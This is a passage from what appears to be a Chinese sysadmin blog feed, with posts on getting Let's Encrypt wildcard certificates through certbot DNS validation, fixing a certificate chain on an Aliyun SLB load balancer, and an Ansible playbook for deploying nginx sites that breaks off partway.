</p><p><strong>而申请通配符证书，只能使用 dns-01 的方式</strong></p><p>–</p><h3 id="申请通配符证书方法"><a href="#申请通配符证书方法" class="headerlink" title="申请通配符证书方法"></a>申请通配符证书方法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./certbot-auto certonly  -d *.devapi.haoshiqi.net --manual --preferred-challenges dns --server https://acme-v02.api.letsencrypt.org/directory</span><br></pre></td></tr></table></figure><p>介绍下相关参数：</p><ul><li>certonly，表示安装模式，Certbot 有安装模式和验证模式两种类型的插件。  </li><li>–manual 表示手动安装插件，Certbot 有很多插件，不同的插件都可以申请证书，用户可以根据需要自行选择  </li><li>-d 为那些主机申请证书，如果是通配符，输入 *.devapi.haoshiqi.net（可以替换为你自己的域名）  </li><li>–preferred-challenges dns，使用 DNS 方式校验域名所有权  </li><li>–server，Let’s Encrypt ACME v2 版本使用的服务器不同于 v1 版本，需要显示指定。  </li></ul><p>下面是命令输出:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">root@docker:~# ./certbot-auto certonly  -d *.devapi.haoshiqi.net --manual --preferred-challenges dns --server https://acme-v02.api.letsencrypt.org/directory</span><br><span class="line">Saving debug log to /var/log/letsencrypt/letsencrypt.log</span><br><span class="line">Plugins selected: Authenticator manual, Installer None</span><br><span class="line">Obtaining a new certificate</span><br><span class="line">Performing the following challenges:</span><br><span class="line">dns-01 challenge for devapi.haoshiqi.net</span><br><span class="line"></span><br><span class="line">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span><br><span class="line">NOTE: The IP of this machine will be publicly logged as having requested this</span><br><span class="line">certificate. If you&apos;re running certbot in manual mode on a machine that is not</span><br><span class="line">your server, please ensure you&apos;re okay with that.</span><br><span class="line"></span><br><span class="line">Are you OK with your IP being logged?</span><br><span class="line">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span><br><span class="line">(Y)es/(N)o: y</span><br><span class="line"></span><br><span class="line">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span><br><span class="line">Please deploy a DNS TXT record under the name</span><br><span class="line">_acme-challenge.devapi.haoshiqi.net with the following value:</span><br><span class="line"></span><br><span class="line">pjTQy43PDXAXBdP3roiftl1uzO-BBidaIG45703ReGs</span><br><span class="line"></span><br><span class="line">Before continuing, verify the record is deployed.</span><br><span class="line">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span><br><span class="line">Press Enter to Continue</span><br></pre></td></tr></table></figure><p>首先,会要求是否同意IP和证书绑定. 输入y继续下一步</p><p>其次,会验证DNS的TXT记录.这里非常关键,先不要回车.Letsencrypt要求配置 DNS TXT 记录，从而校验域名所有权，也就是判断证书申请者是否有域名的所有权。  </p><p>上面要求给_acme-challenge.devapi.haoshiqi.net配置一条TXT记录.记录值为:pjTQy43PDXAXBdP3roiftl1uzO-BBidaIG45703ReGs</p><p>我们使用的是DnsPort域名解析服务也就是腾讯DNS运营商.在域名的DNS解析记录里添加一条主机记录:_acme-challenge.devapi,对应上面的txt值即可.具体配置过程就不再介绍了</p><p>配置完成后,先检查一下配置是否生效:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> huangyong@huangyong-Macbook-Pro  ~  dig -t txt _acme-challenge.devapi.haoshiqi.net @8.8.8.8</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; -t txt _acme-challenge.devapi.haoshiqi.net @8.8.8.8</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 3656</span><br><span class="line">;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1</span><br><span class="line"></span><br><span class="line">;; OPT PSEUDOSECTION:</span><br><span class="line">; EDNS: version: 0, flags:; udp: 512</span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;_acme-challenge.devapi.haoshiqi.net. INTXT</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">_acme-challenge.devapi.haoshiqi.net. 599 IN TXT&quot;pjTQy43PDXAXBdP3roiftl1uzO-BBidaIG45703ReGs&quot;</span><br></pre></td></tr></table></figure><p>可以看到已经生效了.此时再回到刚才的界面,按回车键..输出如下信息:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span><br><span class="line">Please deploy a DNS TXT record under the name</span><br><span class="line">_acme-challenge.devapi.haoshiqi.net with the following value:</span><br><span class="line"></span><br><span class="line">pjTQy43PDXAXBdP3roiftl1uzO-BBidaIG45703ReGs</span><br><span class="line"></span><br><span class="line">Before continuing, verify the record is deployed.</span><br><span class="line">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span><br><span class="line">Press Enter to Continue</span><br><span class="line">Waiting for verification...</span><br><span class="line">Cleaning up challenges</span><br><span class="line"></span><br><span class="line">IMPORTANT NOTES:</span><br><span class="line"> - Congratulations! Your certificate and chain have been saved at:</span><br><span class="line">   /etc/letsencrypt/live/devapi.haoshiqi.net/fullchain.pem</span><br><span class="line">   Your key file has been saved at:</span><br><span class="line">   /etc/letsencrypt/live/devapi.haoshiqi.net/privkey.pem</span><br><span class="line">   Your cert will expire on 2019-01-13. To obtain a new or tweaked</span><br><span class="line">   version of this certificate in the future, simply run certbot-auto</span><br><span class="line">   again. To non-interactively renew *all* of your certificates, run</span><br><span class="line">   &quot;certbot-auto renew&quot;</span><br><span class="line"> - If you like Certbot, please consider supporting our work by:</span><br><span class="line"></span><br><span class="line">   Donating to ISRG / Let&apos;s Encrypt:   https://letsencrypt.org/donate</span><br><span class="line">   Donating to EFF:                    https://eff.org/donate-le</span><br><span class="line"></span><br><span class="line">root@docker:~#</span><br></pre></td></tr></table></figure><p>证书申请成功,证书和秘钥保存在下面的目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@docker:~# ls -l /etc/letsencrypt/live/devapi.haoshiqi.net/</span><br><span class="line">total 4</span><br><span class="line">lrwxrwxrwx 1 root root  43 Oct 15 15:46 cert.pem -&gt; ../../archive/devapi.haoshiqi.net/cert1.pem</span><br><span class="line">lrwxrwxrwx 1 root root  44 Oct 15 15:46 chain.pem -&gt; ../../archive/devapi.haoshiqi.net/chain1.pem</span><br><span class="line">lrwxrwxrwx 1 root root  48 Oct 15 15:46 fullchain.pem -&gt; ../../archive/devapi.haoshiqi.net/fullchain1.pem</span><br><span class="line">lrwxrwxrwx 1 root root  46 Oct 15 15:46 privkey.pem -&gt; ../../archive/devapi.haoshiqi.net/privkey1.pem</span><br><span class="line">-rw-r--r-- 1 root root 682 Oct 15 15:46 README</span><br></pre></td></tr></table></figure><p>–</p><h3 id="Nginx配置证书"><a href="#Nginx配置证书" class="headerlink" title="Nginx配置证书"></a>Nginx配置证书</h3><p>证书申请下来后,就可以在nginx配置证书了.配置方法比较简单.只需要在nginx配置文件中添加几行命令即可.例如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@docker:~# vim /data/conf/nginx/conf.d/hsq-openapi.conf</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">  listen 443 ssl http2;</span><br><span class="line"></span><br><span class="line">  server_name m.devapi.haoshiqi.net; # 域名</span><br><span class="line"> </span><br><span class="line"> #添加或者修改以下3行SSL配置:</span><br><span class="line"> </span><br><span class="line">    ssl_certificate /etc/letsencrypt/live/devapi.haoshiqi.net/fullchain.pem;</span><br><span class="line">    ssl_certificate_key /etc/letsencrypt/live/devapi.haoshiqi.net/privkey.pem;</span><br><span class="line">    ssl_trusted_certificate  /etc/letsencrypt/live/devapi.haoshiqi.net/chain.pem;</span><br></pre></td></tr></table></figure><p>重启nginx,浏览器访问域名.通配符证书已经生效.如下图所示:</p><p><img src="http://pabkmteb4.bkt.clouddn.com/letsencrypt.png" alt=""></p><p>–</p><h3 id="通配符证书自动续期"><a href="#通配符证书自动续期" class="headerlink" title="通配符证书自动续期"></a>通配符证书自动续期</h3><p>letsencrypt的通配符证书的有效期同样为90天.但是通配符的自动续约比较复杂.因为需要人工配置DNS记录来验证域名控制权,所以不能像单域名证书一样使用certbot工具来自动续约了.</p><p>不过好在网络上有很多大神写了一些比较优秀的脚本工具来通过调用DNS解析运营商的API接口实现自动配置DNS记录.收集了2个作者的脚本来实现自动续期:</p><ul><li><a href="https://github.com/ywdblog/certbot-letencrypt-wildcardcertificates-alydns-au" target="_blank" rel="noopener">本文原作者编写的工具</a></li><li><a href="https://github.com/Neilpang/acme.sh/tree/master/dnsapi" target="_blank" rel="noopener">acme脚本</a></li></ul><p>–</p><p>本文大部分知识点来自于:<a href="https://www.jianshu.com/p/c5c9d071e395" target="_blank" rel="noopener">https://www.jianshu.com/p/c5c9d071e395</a></p><p>非常感谢原文作者!</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;letsencrypt配置通配符域名证书&quot;&gt;&lt;a href=&quot;#letsencrypt配置通配符域名证书&quot; class=&quot;headerlink&quot; title=&quot;letsencrypt配置通配符域名证书&quot;&gt;&lt;/a&gt;letsencrypt配置通配符域名证书&lt;/h2&gt;&lt;h3 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h3&gt;&lt;p&gt;在今年稍早些的时候,letsencrypt终于开始免费支持通配符域名证书了.但是只支持一个层级的通配主机域名.&lt;/p&gt;
&lt;p&gt;比如我曾经踩过的坑:*.dev.xxx.com通配符域名证书并不能支持api.v3.dev.xxx.com这种三层子域名.&lt;/p&gt;
&lt;p&gt;如果需要为api.v3.dev.xxx.com申请通配符证书,则还需要申请*.v3.dev.xxx.com通配符证书&lt;/p&gt;
    
    </summary>
    
      <category term="Linux-Basic" scheme="https://jesse.top/categories/Linux-Basic/"/>
    
      <category term="SSL" scheme="https://jesse.top/categories/Linux-Basic/SSL/"/>
    
    
      <category term="SSL" scheme="https://jesse.top/tags/SSL/"/>
    
  </entry>
  
  <entry>
    <title>letsencrypt证书上传到阿里云SLB负载均衡</title>
    <link href="https://jesse.top/2018/10/15/Linux-Basic/SSL/letsencrypt%E8%AF%81%E4%B9%A6%E4%B8%8A%E4%BC%A0%E5%88%B0%E9%98%BF%E9%87%8C%E4%BA%91SLB/"/>
    <id>https://jesse.top/2018/10/15/Linux-Basic/SSL/letsencrypt证书上传到阿里云SLB/</id>
    <published>2018-10-15T03:59:58.000Z</published>
    <updated>2019-02-17T09:31:38.012Z</updated>
    
    <content type="html"><![CDATA[<h2 id="letsencrypt证书上传到阿里云SLB负载均衡"><a href="#letsencrypt证书上传到阿里云SLB负载均衡" class="headerlink" title="letsencrypt证书上传到阿里云SLB负载均衡"></a>letsencrypt证书上传到阿里云SLB负载均衡</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>最近在阿里云开通了一个SLB负载均衡实例,然后把ECS上申请的免费的letsencrypt证书上传到SLB下.</p><p>按照简书上的这个流程: <a href="https://www.jianshu.com/p/b1814f200fef" target="_blank" rel="noopener">letsencrypt证书上传到阿里云SLB</a></p><p>但是出现了一个奇怪的现象.浏览器,PC,IOS等设备Https访问均正常,但是所有的安卓设备微信扫码小程序登陆却提示证书错误:<strong>err:request:fail ssl hand shake error</strong></p><a id="more"></a><hr><h3 id="SSL诊断"><a href="#SSL诊断" class="headerlink" title="SSL诊断"></a>SSL诊断</h3><p>使用SSL在线诊断工具<a href="http://aq.chinaz.com/" target="_blank" rel="noopener">SSL检测</a> .可以看到确实是证书存在一些问题.在网上baidu和google搜寻也没有太多可用的资料.</p><p>但是我将该域名解析到ECS本地(SLB上的letsencrypt证书就是该ECS上申请的).再次利用SSL在线诊断工具,发现证书一切正常.安卓访问该域名也没有问题.</p><p>于是,初步判断是证书上传到SLB后出现的问题.</p><hr><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>根据阿里云的文档<a href="https://help.aliyun.com/document_detail/32332.html" target="_blank" rel="noopener">SSL要求</a>.letsencrypt是中级证书颁发机构,申请下来的证书包含了多个证书文件.其中包含以下主要的4个文件:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@DWD-BETA m.betaapi.haoshiqi.net]# ls</span><br><span class="line">cert.pem  chain.pem  fullchain.pem  privkey.pem  README</span><br></pre></td></tr></table></figure><p>cert.pem                #服务器证书</p><p>chain.pem          #浏览器需要的所有证书但不包括服务端证书，比如根证书和中间证书</p><p>fullchain.pem     #中级证书,包括了cert.pem和chain.pem的内容</p><p>privkey.pem        #服务器证书私钥</p><p>由于刚才只将cert.pem服务器证书和privkey.pem服务器证书私钥文件上传到SLB.所以出现证书错误的异常情况.</p><hr><h3 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h3><p>根据上面阿里云的文档,在阿里云SLB上创建证书时,将cert.pem证书和fullchain.pem证书内容复制到”公钥证书”栏中.</p><p>注意:服务器证书(cert.pem)放第一位，中级证书(fullchain.pem)放第二位，中间不能有空行。</p><p>接下来将privkey.pem私钥证书放在”私钥”一栏中.</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;letsencrypt证书上传到阿里云SLB负载均衡&quot;&gt;&lt;a href=&quot;#letsencrypt证书上传到阿里云SLB负载均衡&quot; class=&quot;headerlink&quot; title=&quot;letsencrypt证书上传到阿里云SLB负载均衡&quot;&gt;&lt;/a&gt;letsencrypt证书上传到阿里云SLB负载均衡&lt;/h2&gt;&lt;h3 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h3&gt;&lt;p&gt;最近在阿里云开通了一个SLB负载均衡实例,然后把ECS上申请的免费的letsencrypt证书上传到SLB下.&lt;/p&gt;
&lt;p&gt;按照简书上的这个流程: &lt;a href=&quot;https://www.jianshu.com/p/b1814f200fef&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;letsencrypt证书上传到阿里云SLB&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;但是出现了一个奇怪的现象.浏览器,PC,IOS等设备Https访问均正常,但是所有的安卓设备微信扫码小程序登陆却提示证书错误:&lt;strong&gt;err:request:fail ssl hand shake error&lt;/strong&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Linux-Basic" scheme="https://jesse.top/categories/Linux-Basic/"/>
    
      <category term="SSL" scheme="https://jesse.top/categories/Linux-Basic/SSL/"/>
    
    
      <category term="SSL" scheme="https://jesse.top/tags/SSL/"/>
    
  </entry>
  
  <entry>
    <title>Ansible部署nginx实战</title>
    <link href="https://jesse.top/2018/08/30/Ansible/Ansible%20%E9%83%A8%E7%BD%B2Nginx%E9%A1%B9%E7%9B%AE%E7%9A%84playbook%E5%AE%9E%E8%B7%B5/"/>
    <id>https://jesse.top/2018/08/30/Ansible/Ansible 部署Nginx项目的playbook实践/</id>
    <published>2018-08-30T14:59:58.000Z</published>
    <updated>2018-12-01T14:27:37.280Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Ansible-部署Nginx项目的playbook实践"><a href="#Ansible-部署Nginx项目的playbook实践" class="headerlink" title="Ansible 部署Nginx项目的playbook实践"></a>Ansible 部署Nginx项目的playbook实践</h2><p>工作中经常需要搭建项目的业务环境.需要部署同一套nginx站点业务在联调,测试,预发布,生产等各种不同环境的服务器上.这些工作主要包括两个部分:创建web资源目录,nginx站点配置.</p><p>下面来看看如何使用playbook来自动化部署项目到不同环境的多台服务器上:</p><a id="more"></a><hr><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><h5 id="1-创建主机inventory清单"><a href="#1-创建主机inventory清单" class="headerlink" title="1.创建主机inventory清单"></a>1.创建主机inventory清单</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@ansible host_vars]$vim /etc/ansible/hosts</span><br><span class="line"></span><br><span class="line">[test]</span><br><span class="line">host100 ansible_host=172.16.1.100</span><br><span class="line">host120 ansible_host=172.16.1.120</span><br><span class="line">host102 ansible_host=172.16.1.102</span><br></pre></td></tr></table></figure><h5 id="1-变量文件"><a href="#1-变量文件" class="headerlink" title="1.变量文件"></a>1.变量文件</h5><p>由于不同的服务器所属不同的环境.所以需要为不同的主机定义所属环境的变量.利用ansible的host_vars主机变量可以轻松实现:</p><ul><li>创建主机变量目录:</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkidr /etc/ansible/host_vars</span><br></pre></td></tr></table></figure><ul><li>为每台主机创建变量文件,定义dwd_env变量.这个变量代表了主机所在的环境,</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@ansible host_vars]$vim host100</span><br><span class="line">---</span><br><span class="line">dwd_env: beta</span><br><span class="line"></span><br><span class="line">[root@ansible host_vars]$vim host102</span><br><span class="line">---</span><br><span class="line">dwd_env: dev</span><br></pre></td></tr></table></figure><blockquote><p>一台远程主机属于beta环境,另外一台属于dev环境.</p><p>host_vars目录下的文件名和inventory主机清单的主机名要保持一致,只要是主机名文件内的变量都会自动被ansible调用在这台主机下</p></blockquote><h5 id="2-nginx的站点配置文件"><a href="#2-nginx的站点配置文件" class="headerlink" title="2.nginx的站点配置文件"></a>2.nginx的站点配置文件</h5><p>这里定义两个站点文件,分别是openapi和internalapi的2套项目环境.配置文件由于需要调用变量,所以使用template模板功能可以很好的满足我们的需求.</p><ul><li>在playbook目录下创建template目录</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir /etc/ansible/playbook/template</span><br></pre></td></tr></table></figure><ul><li>创建internalapi的nginx虚拟主机</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[root@ansible template]$vim nginx-internal.conf </span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">  listen 80;</span><br><span class="line"></span><br><span class="line">#不同的环境的域名也不同.这里调用了dwd_env变量.对于dev环境的主机来说.server_name就是#internal.dev.msf.net</span><br><span class="line"></span><br><span class="line">  server_name internal.&#123;&#123; dwd_env &#125;&#125;.msf.net;</span><br><span class="line">  root /data/apps/msf-internal-api-&#123;&#123; dwd_env &#125;&#125;/; # 站点根目录</span><br><span class="line"></span><br><span class="line">  error_log /data/logs/nginx/msf_internal.error.log;</span><br><span class="line">  access_log /data/logs/nginx/msf_internal.access.log main;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  location / &#123;</span><br><span class="line">    index index.html;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这里为了演示,所以配置文件比较简单.当然结合template的变量,循环,条件判断等功能,也可以根据需求编写出复杂的nginx站点配置文件</p></blockquote><ul><li>创建openapi的nginx虚拟主机</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[root@ansible template]$vim nginx-open.conf </span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">  listen 80;</span><br><span class="line"></span><br><span class="line">  server_name open.&#123;&#123; dwd_env &#125;&#125;.msf.net;</span><br><span class="line">  root /data/apps/msf-open-api-&#123;&#123; dwd_env &#125;&#125;/; # 站点根目录</span><br><span class="line"></span><br><span class="line">  error_log /data/logs/nginx/msf_open.error.log;</span><br><span class="line">  access_log /data/logs/nginx/msf_open.access.log main;</span><br><span class="line"></span><br><span class="line">  # 如果URL中包含app.php，则转发为伪静态格式</span><br><span class="line"></span><br><span class="line">  location / &#123;</span><br><span class="line">    index index.html;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="3-创建nginx的index-html首页文件-这里为了演示也只是编写一个简单文件"><a href="#3-创建nginx的index-html首页文件-这里为了演示也只是编写一个简单文件" class="headerlink" title="3.  创建nginx的index.html首页文件.这里为了演示也只是编写一个简单文件"></a>3.  创建nginx的index.html首页文件.这里为了演示也只是编写一个简单文件</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#创建file目录,用于统一存放Playbook的文件</span><br><span class="line">mkdir /etc/ansible/playbook/files</span><br><span class="line"></span><br><span class="line">#创建openapi的首页文件</span><br><span class="line">[root@ansible files]$cat nginx-open.html </span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">   &lt;title&gt;Welcome to dwd openapi website &lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line"></span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;h1&gt;nginx,configured by ansible&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;If you see this,Ansible successfully installed and configured nginx .&lt;/p&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">#创建internalapi的首页文件</span><br><span class="line">[root@ansible files]$cat nginx-internal.html </span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">   &lt;title&gt;Welcome to dwd internal website &lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line"></span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;h1&gt;nginx,configured by ansible&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;If you see this,Ansible successfully installed and configured nginx .&lt;/p&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><hr><h3 id="编排playbook"><a href="#编排playbook" class="headerlink" title="编排playbook"></a>编排playbook</h3><p>nginx所需的配置文件和资源站点文件都准备完毕后,就可以编排playbook了.</p><p>playbook大致分为以下几个tasks:</p><ul><li>检查nginx是否安装,(如果是新服务器,或者在nginx服务器上添加新项目,则步骤可略)</li><li>添加nginx的yum源,安装nginx (同上)</li><li>创建nginx站点资源目录</li><li>在该目录下,创建nginx主页文件</li><li>创建nginx虚拟主机配置文件(重启nginx服务)</li><li>启动nginx</li></ul><p>下面是具体的Playbook文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">[root@ansible playbook]$cat  nginx_env.yml </span><br><span class="line">---</span><br><span class="line">#all:!主机名的用法表示除了这台服务器外,在所有主机节点执行playbook</span><br><span class="line"> - hosts: all:!host120</span><br><span class="line">   remote_user: root</span><br><span class="line">   tasks:</span><br><span class="line">    </span><br><span class="line">    #这里用到了register注册变量,并且忽略了task执行错误的情况.判断是否有nginx的yum源</span><br><span class="line">     - name: check if there is nginx repo on server</span><br><span class="line">       shell: yum repolist all | grep nginx</span><br><span class="line">       register: nginx_repo</span><br><span class="line">       ignore_errors: True</span><br><span class="line"></span><br><span class="line">   #这里用到了when条件判断,如果变量nginx_repo执行失败,则添加nginx的yum源</span><br><span class="line">     - name: install nginx yum repo,if there is no nginx repo</span><br><span class="line">       command: rpm -Uvh http://nginx.org/packages/centos/7/noarch/RPMS/nginx-release-centos-7-0.el7.ngx.noarch.rpm</span><br><span class="line">       when: nginx_repo is failed</span><br><span class="line"></span><br><span class="line">     - name: install nginx</span><br><span class="line">       yum: name=nginx state=present</span><br><span class="line">      </span><br><span class="line">   #创建Nginx资源目录,这里使用了嵌套循环.item[0]表示循环&apos;open&apos;,&apos;internal&apos;.在每次循环item[0]时都循环一遍item[1],也就是&apos;release,vendor,shared.</span><br><span class="line">   #下面的语句类似于shell的命令:</span><br><span class="line">   mkdir -pv /data/apps/msf-&#123;open,internal&#125;-api/&#123;releases,vendor,shared&#125;</span><br><span class="line">   </span><br><span class="line">     - name: create project dir</span><br><span class="line">       file: path=/data/apps/msf-&#123;&#123; item[0] &#125;&#125;-api-&#123;&#123; dwd_env &#125;&#125;/&#123;&#123; item[1] &#125;&#125; recurse=yes owner=root group=root mode=0644 state=directory</span><br><span class="line">       with_nested:</span><br><span class="line">         - [&apos;open&apos;,&apos;internal&apos;]</span><br><span class="line">         - [&apos;releases&apos;,&apos;vendor&apos;,&apos;shared&apos;]</span><br><span class="line"></span><br><span class="line">     - name: create nginx log dir</span><br><span class="line">       file: path=/data/logs/nginx state=directory recurse=yes owner=root group=root mode=0644</span><br><span class="line">    </span><br><span class="line">    #下面使用了with_items的标准循环</span><br><span class="line">     - name: copy nginx conf file</span><br><span class="line">       template: 